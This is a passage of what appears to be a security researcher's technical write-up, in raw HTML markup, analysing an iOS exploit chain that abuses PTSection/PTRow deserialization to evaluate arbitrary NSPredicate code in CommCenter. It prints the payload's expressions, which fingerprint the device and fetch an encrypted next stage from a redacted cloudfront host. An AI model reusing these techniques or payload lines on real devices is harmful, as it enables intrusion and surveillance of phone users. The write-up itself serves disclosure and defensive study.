YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; AccessibilitySharedSupport.framework/AccessibilitySharedSupport&amp;#39;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;#39;/System/Library/PrivateFrameworks/Sharing.framework/Sharing&amp;#39;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;#39;/System/Library/PrivateFrameworks/\\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; PrototypeTools.framework/PrototypeTools&amp;#39;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;This explains how the deserialization of a &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTSection&lt;/span&gt;&lt;span&gt;&amp;nbsp;will succeed. But what&amp;#39;s so special about &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTSections&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTRows&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;?&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.tsdrbvcjutdl\"&gt;&lt;span&gt;Predicated Sections&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[PTRow initwithcoder:]&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;contains the following snippet:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; self-&amp;gt;condition = [coder decodeObjectOfClass:NSPredicate&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;forKey:@&amp;quot;condition&amp;quot;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; [self-&amp;gt;condition allowEvaluation]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;This will deserialize an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;object, assign it to the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTRow&lt;/span&gt;&lt;span&gt;&amp;nbsp;member variable &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;condition&lt;/span&gt;&lt;span&gt;&amp;nbsp;and call &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;allowEvaluation&lt;/span&gt;&lt;span&gt;. This is meant to indicate that the deserializing code considers this predicate safe, but there&amp;#39;s no attempt to perform any validation on the predicate contents here. They then need one more trick to find a path to which will additionally evaluate the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTRow&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;#39;s condition predicate.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Here&amp;#39;s a snippet from &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[PTSection initWithCoder:]&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSSet* allowed = [NSSet setWithObjects: @[PTRow]]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;id* rows = [coder &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;decodeObjectOfClasses&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;:allowed forKey:@&amp;quot;rows&amp;quot;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[self initWithRows:rows]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;This deserializes an array of &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTRows&lt;/span&gt;&lt;span&gt;&amp;nbsp;and passes them to &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[PTSection initWithRows]&lt;/span&gt;&lt;span&gt;&amp;nbsp;which assigns a copy of the array of &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTRows&lt;/span&gt;&lt;span&gt;&amp;nbsp;to&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;&amp;nbsp;PTSection-&amp;gt;rows&lt;/span&gt;&lt;span&gt;&amp;nbsp;then calls &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[self &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;_reloadEnabledRows&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;]&lt;/span&gt;&lt;span&gt;&amp;nbsp;which in turn passes each row to &lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[self _shouldEnableRow:]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;_shouldEnableRow:row {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; if (row-&amp;gt;condition) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; return [row-&amp;gt;condition evaluateWithObject: self-&amp;gt;settings]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;And thus, by sending a &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTSection&lt;/span&gt;&lt;span&gt;&amp;nbsp;containing a single &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTRow&lt;/span&gt;&lt;span&gt;&amp;nbsp;with an attached condition &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;they can cause the evaluation of an arbitrary &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;, effectively equivalent to arbitrary code execution in the context of &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CommCenter&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;. &lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.9aaj7tmx81zt\"&gt;&lt;span class=\"YDzVciBUld-c9 YDzVciBUld-c3\"&gt;Payload 2&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;attached to the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTRow&lt;/span&gt;&lt;span&gt;&amp;nbsp;uses a similar trick to the first payload to cause the evaluation of six independent &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;, but this time in the context of the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;process. &lt;/span&gt;&lt;span&gt;They&amp;#39;re presented here in pseudo Objective-C:&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"YDzVciBUld-c8\" id=\"h.4c2mqlgknm1m\"&gt;&lt;span class=\"YDzVciBUld-c10 YDzVciBUld-c3\"&gt;Expression 1&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[ &amp;nbsp;[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp;setObject:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;@[[NSURLComponents&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;componentsWithString:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;@&amp;quot;https://cloudfront.net/XXX/XXX/XXX?aaaa&amp;quot;], &amp;#39;0&amp;#39;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp;forKey: @&amp;quot;0&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;The use of &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a trick to enable the array of independent &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;&amp;nbsp;to have &amp;quot;local variables&amp;quot;. In this first case they create an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0 YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://developer.apple.com/documentation/foundation/nsurlcomponents\"&gt;NSURLComponents&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;object which is used to build parameterised URLs. This URL builder is then stored in the global dictionary returned by &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;span&gt;&amp;nbsp;under the key &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;0&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;quot;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"YDzVciBUld-c8\" id=\"h.f96qjcb9lnky\"&gt;&lt;span class=\"YDzVciBUld-c10 YDzVciBUld-c3\"&gt;Expression 2&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[[NSBundle&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; bundleWithPath:@&amp;quot;/System/Library/PrivateFrameworks/\\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;SlideshowKit.framework/Frameworks/OpusFoundation.framework&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp;] load]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;This causes the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;OpusFoundation&lt;/span&gt;&lt;span&gt;&amp;nbsp;library to be loaded. The exact reason for this is unclear, though the dependency graph of &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;OpusFoundation&lt;/span&gt;&lt;span&gt;&amp;nbsp;does include &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;AuthKit&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is used by the next &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpression&lt;/span&gt;&lt;span&gt;. It&amp;#39;s possible that this payload is generic and might also be expected to work when evaluated in processes where &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;AuthKit&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t loaded.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"YDzVciBUld-c8\" id=\"h.o9lhtiv01xpk\"&gt;&lt;span class=\"YDzVciBUld-c3 YDzVciBUld-c10\"&gt;Expression 3&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[ [ [CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; objectForKey:@&amp;quot;0&amp;quot; ]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; setQueryItems:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; [ [ [NSArray arrayWithObject: &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;[NSURLQueryItem&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queryItemWithName: @&amp;quot;m&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; value:[AKDevice _hardwareModel] ]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;] arrayByAddingObject: &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;[NSURLQueryItem&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queryItemWithName: @&amp;quot;v&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; value:[AKDevice _buildNumber] ]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;] arrayByAddingObject:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;[NSURLQueryItem&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queryItemWithName: @&amp;quot;u&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; value:[NSString randomString]]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;This grabs a reference to the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSURLComponents&lt;/span&gt;&lt;span&gt;&amp;nbsp;object stored under the &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;quot; key in the global &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;sharedAnonymizedStrings&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;dictionary then parameterizes the HTTP query string with three values:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[AKDevice _hardwareModel]&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns a string like &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;iPhone12,3&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;quot; which determines the exact device model.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[AKDevice _buildNumber]&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns a string like &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;18A8395&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;quot; which in combination with the device model allows determining the exact firmware image running on the device.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[NSString randomString]&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns a decimal string representation of a 32-bit random integer like &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;394681493&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;quot;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"YDzVciBUld-c8\" id=\"h.ifxeb8zet13e\"&gt;&lt;span class=\"YDzVciBUld-c10 YDzVciBUld-c3\"&gt;Expression 4&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[ [CaliCalendarAnonymizer sharedAnonymizedString]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; setObject:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; [NSPropertyListSerialization&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; propertyListWithData:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [[[NSData&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;dataWithContentsOfURL:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;[[[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;objectForKey:@&amp;quot;0&amp;quot;] URL]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ] AES128DecryptWithPassword:NSData(XXXX)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;] &amp;nbsp;decompressedDataUsingAlgorithm:3 error:]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;options: Class(NSConstantValueExpression)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; format: Class(NSConstantValueExpression)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; errors:Class(NSConstantValueExpression)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; ]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; forKey:@&amp;quot;1&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span 